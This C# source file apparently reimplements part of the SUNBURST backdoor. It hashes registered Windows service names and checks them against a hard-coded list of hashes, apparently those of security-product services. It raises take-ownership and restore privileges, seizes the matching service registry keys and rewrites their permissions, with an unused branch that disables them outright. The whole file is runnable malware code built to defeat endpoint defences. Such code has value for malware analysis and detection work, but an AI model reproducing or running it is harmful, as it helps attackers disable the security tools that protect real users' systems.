using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Management;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
namespace Sunburst
{
    class Program
    {
        private static ulong GetHash(string s)
        {
            ulong num = 14695981039346656037UL;
            try
            {
                foreach (byte b in Encoding.UTF8.GetBytes(s))
                {
                    num ^= (ulong)b;
                    num *= 1099511628211UL;
                }
            }
            catch
            {
            }
            return num ^ 6605813339339102567UL;
        }
        private static string GetNewOwnerName()
        {
            string text = null;
            string value = "S-1-5-";
            string value2 = "-500";
            try
            {
                text = new NTAccount("Administrator").Translate(typeof(SecurityIdentifier)).Value;
            }
            catch
            {
            }
            if (string.IsNullOrEmpty(text) || !text.StartsWith(value, StringComparison.OrdinalIgnoreCase) || !text.EndsWith(value2, StringComparison.OrdinalIgnoreCase))
            {
                string queryString = "Select * From Win32_UserAccount";
                text = null;
                using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(queryString))
                {
                    foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
                    {
                        ManagementObject managementObject = (ManagementObject)managementBaseObject;
                        string text2 = managementObject.Properties["SID"].Value.ToString();
                        if (managementObject.Properties["LocalAccount"].Value.ToString().ToLower() == "true" && text2.StartsWith(value, StringComparison.OrdinalIgnoreCase))
                        {
                            if (text2.EndsWith(value2, StringComparison.OrdinalIgnoreCase))
                            {
                                text = text2;
                                break;
                            }
                            if (string.IsNullOrEmpty(text))
                            {
                                text = text2;
                            }
                        }
                    }
                }
            }
            return new SecurityIdentifier(text).Translate(typeof(NTAccount)).Value;
        }

        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CloseHandle(IntPtr handle);

        // Token: 0x060009DB RID: 2523
        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool AdjustTokenPrivileges([In] IntPtr TokenHandle, [MarshalAs(UnmanagedType.Bool)] [In] bool DisableAllPrivileges, [In] ref TOKEN_PRIVILEGE NewState, [In] uint BufferLength, [In] [Out] ref TOKEN_PRIVILEGE PreviousState, [In] [Out] ref uint ReturnLength);

        // Token: 0x060009DC RID: 2524
        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool LookupPrivilegeValueW([In] string lpSystemName, [In] string lpName, [In] [Out] ref LUID Luid);

        // Token: 0x060009DD RID: 2525
        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetCurrentProcess();

        // Token: 0x060009DE RID: 2526
        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool OpenProcessToken([In] IntPtr ProcessToken, [In] TokenAccessLevels DesiredAccess, [In] [Out] ref IntPtr TokenHandle);

        // Token: 0x060009DF RID: 2527
        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool InitiateSystemShutdownExW([In] string lpMachineName, [In] string lpMessage, [In] uint dwTimeout, [MarshalAs(UnmanagedType.Bool)] [In] bool bForceAppsClosed, [MarshalAs(UnmanagedType.Bool)] [In] bool bRebootAfterShutdown, [In] uint dwReason);


        public static bool SetProcessPrivilege(string privilege, bool newState, out bool previousState)
        {
            bool flag = false;
            previousState = false;
            bool result;
            try
            {
                IntPtr zero = IntPtr.Zero;
                LUID luid = default(LUID);
                luid.LowPart = 0U;
                luid.HighPart = 0U;
                if (!OpenProcessToken(GetCurrentProcess(), TokenAccessLevels.Query | TokenAccessLevels.AdjustPrivileges, ref zero))
                {
                    result = false;
                }
                else if (!LookupPrivilegeValueW(null, privilege, ref luid))
                {
                    CloseHandle(zero);
                    result = false;
                }
                else
                {
                    TOKEN_PRIVILEGE token_PRIVILEGE = default(TOKEN_PRIVILEGE);
                    TOKEN_PRIVILEGE token_PRIVILEGE2 = default(TOKEN_PRIVILEGE);
                    token_PRIVILEGE.PrivilegeCount = 1U;
                    token_PRIVILEGE.Privilege.Luid = luid;
                    token_PRIVILEGE.Privilege.Attributes = (newState ? 2U : 0U);
                    uint num = 0U;
                    AdjustTokenPrivileges(zero, false, ref token_PRIVILEGE, (uint)Marshal.SizeOf(token_PRIVILEGE2), ref token_PRIVILEGE2, ref num);
                    previousState = ((token_PRIVILEGE2.Privilege.Attributes & 2U) > 0U);
                    flag = true;
                    CloseHandle(zero);
                    result = true;
                }
            }
            catch (Exception)
            {
                result = flag;
            }
            return result;
        }

        private static void SetKeyOwner(RegistryKey key, string subKey, string owner)
        {
            using (RegistryKey registryKey = key.OpenSubKey(subKey, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.TakeOwnership))
            {
                RegistrySecurity registrySecurity = new RegistrySecurity();
                registrySecurity.SetOwner(new NTAccount(owner));
                registryKey.SetAccessControl(registrySecurity);
            }
        }

        private static void SetKeyOwnerWithPrivileges(RegistryKey key, string subKey, string owner)
        {
            try
            {
                SetKeyOwner(key, subKey, owner);
            }
            catch
            {
                bool newState = false;
                bool newState2 = false;
                bool flag = false;
                bool flag2 = false;
                string privilege = "SeRestorePrivilege";
                string privilege2 = "SeTakeOwnershipPrivilege";
                flag = SetProcessPrivilege(privilege2, true, out newState);
                flag2 = SetProcessPrivilege(privilege, true, out newState2);
                try
                {
                    SetKeyOwner(key, subKey, owner);
                }
                finally
                {
                    if (flag)
                    {
                        SetProcessPrivilege(privilege2, newState, out newState);
                    }
                    if (flag2)
                    {
                        SetProcessPrivilege(privilege, newState2, out newState2);
                    }
                }
            }
        }

        public static void SetKeyPermissions(RegistryKey key, string subKey, bool reset)
        {
            bool isProtected = !reset;
            string text = "SYSTEM";
            string text2 = reset ? text : GetNewOwnerName();
            SetKeyOwnerWithPrivileges(key, subKey, text);
            using (RegistryKey registryKey = key.OpenSubKey(subKey, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.ChangePermissions))
            {
                RegistrySecurity registrySecurity = new RegistrySecurity();
                if (!reset)
                {
                    RegistryAccessRule rule = new RegistryAccessRule(text2, RegistryRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
                    registrySecurity.AddAccessRule(rule);
                }
                registrySecurity.SetAccessRuleProtection(isProtected, false);
                registryKey.SetAccessControl(registrySecurity);
            }
            if (!reset)
            {
                SetKeyOwnerWithPrivileges(key, subKey, text2);
            }
        }
        public static bool SetManualMode(List<ulong> svcList)
        {
            try
            {
                bool result = false;
                using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\services"))
                {
                    foreach (string text in registryKey.GetSubKeyNames())
                    {
                        foreach (ulong service in svcList)
                        {
                            try
                            {
                                if (GetHash(text.ToLower()) == service)
                                {
                                    // this is true if the service is running
                                    // simplification of code
                                    if (true) 
                                    {
                                        result = true;
                                        SetKeyPermissions(registryKey, text, false);
                                    }
                                    else
                                    {
                                        using (RegistryKey registryKey2 = registryKey.OpenSubKey(text, true))
                                        {
                                            if (registryKey2.GetValueNames().Contains("Start"))
                                            {
                                                registryKey2.SetValue("Start", 4, RegistryValueKind.DWord);
                                                result = true;
                                            }
                                        }
                                    }
                                }
                            }
                            catch (Exception)
                            {
                            }

                        }
                    }
                }
                return result;
            }
            catch (Exception)
            {
            }
            return false;
        }

        // Token: 0x04000319 RID: 793
        private const uint SE_PRIVILEGE_DISABLED = 0U;

        // Token: 0x0400031A RID: 794
        private const uint SE_PRIVILEGE_ENABLED = 2U;

        // Token: 0x0400031B RID: 795
        private const string ADVAPI32 = "advapi32.dll";

        // Token: 0x0400031C RID: 796
        private const string KERNEL32 = "kernel32.dll";

        // Token: 0x020001D2 RID: 466
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct LUID
        {
            // Token: 0x040005D4 RID: 1492
            public uint LowPart;

            // Token: 0x040005D5 RID: 1493
            public uint HighPart;
        }

        // Token: 0x020001D3 RID: 467
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct LUID_AND_ATTRIBUTES
        {
            // Token: 0x040005D6 RID: 1494
            public LUID Luid;

            // Token: 0x040005D7 RID: 1495
            public uint Attributes;
        }

        // Token: 0x020001D4 RID: 468
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct TOKEN_PRIVILEGE
        {
            // Token: 0x040005D8 RID: 1496
            public uint PrivilegeCount;

            // Token: 0x040005D9 RID: 1497
            public LUID_AND_ATTRIBUTES Privilege;
        }
      

        static void Main(string[] args)
        {

            var serviceHashList = new List<ulong>() {5183687599225757871,
917638920165491138,
10063651499895178962,
16335643316870329598,
10501212300031893463,
155978580751494388,
17204844226884380288,
5984963105389676759,
11385275378891906608,
13693525876560827283,
17849680105131524334,
18246404330670877335,
8698326794961817906,
9061219083560670602,
11771945869106552231,
9234894663364701749,
8698326794961817906,
15695338751700748390,
640589622539783622,
15695338751700748390,
9384605490088500348,
6274014997237900919,
15092207615430402812,
3320767229281015341,
3200333496547938354,
14513577387099045298,
607197993339007484,
15587050164583443069,
9559632696372799208,
4931721628717906635,
3200333496547938354,
2589926981877829912,
17997967489723066537,
14079676299181301772,
17939405613729073960,
521157249538507889,
14971809093655817917,
10545868833523019926,
15039834196857999838,
14055243717250701608,
5587557070429522647,
12445177985737237804,
17978774977754553159,
17017923349298346219,
17624147599670377042,
16066651430762394116,
13655261125244647696,
12445177985737237804,
3421213182954201407,
14243671177281069512,
16112751343173365533,
3425260965299690882,
9333057603143916814,
3413886037471417852,
7315838824213522000,
13783346438774742614,
2380224015317016190,
3413052607651207697,
3407972863931386250,
10393903804869831898,
12445232961318634374,
3421197789791424393,
14111374107076822891,
541172992193764396};

           SetManualMode(serviceHashList);
       
        }
    }
}
